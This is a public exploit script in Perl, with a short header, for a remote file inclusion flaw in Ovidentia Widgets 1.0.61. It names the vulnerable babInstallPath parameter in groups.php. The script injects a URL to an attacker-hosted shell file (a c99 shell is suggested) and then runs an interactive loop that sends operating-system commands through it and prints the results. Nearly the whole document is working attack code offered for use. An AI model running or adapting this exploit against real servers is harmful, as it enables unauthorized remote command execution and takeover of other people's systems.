# Title: Ovidentia Widgets 1.0.61 Remote Command Execution Exploit
# Author: bd0rk
# eMail: bd0rk[at]hackermail.com
# Twitter: twitter.com/bd0rk
# Tested on: Ubuntu-Linux
# Download: http://www.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FAdd-ons%2FLibrairies+partagees%2FWidgets&file=widgets-1-0-61.zip&idf=870
# The $GLOBALS['babInstallPath']-parameter in /programs/groups.php line 24 is vulnerable for it.
# Use some shellcode / c99 for example.
----------------
~~Exploitcode~~
----------------

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub bd0rk {
print "Ovidentia Widgets 1.0.61 Remote Command Execution Exploit\n";
print "Sploit:\n";
print "$0 -v \"http://[target]/path/programs/\" -shellcode \"http://[target]/shell.txt?\"\n\n";
exit();
}

my $a = GetOptions (
'v=s'          => \$v,
'shellcode=s'   => \$shellcode
);

&bd0rk unless ($v);
&bd0rk unless ($shellcode);

&bd0rk if $bd0rk eq 1;

chomp($v);
chomp($shellcode);

while (){

print "[shellcode]:~\$ ";
chomp($cmd=<STDIN>);

if ($cmd eq "exit" || $cmd eq "quit") {
exit 0;
}
my $agent = LWP::UserAgent->new;
$in="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
chomp($in);
my $a = $v ."/widgets-1-0-61/programs/groups.php?GLOBALS[babInstallPath]=" . $shellcode . $in;
chomp $a;
my $request = HTTP::Request->new(Get => $a);
my $resource = $agent->request($request);
my $content = $resource->content;
if ($resource->is_success){
print $1,"\n" if ($content =~ m/readonly> (.*?)\<\/textarea>/mosix);
}

else
{
print "EXPLOIT FAILURE\n";
exit(1);
}
}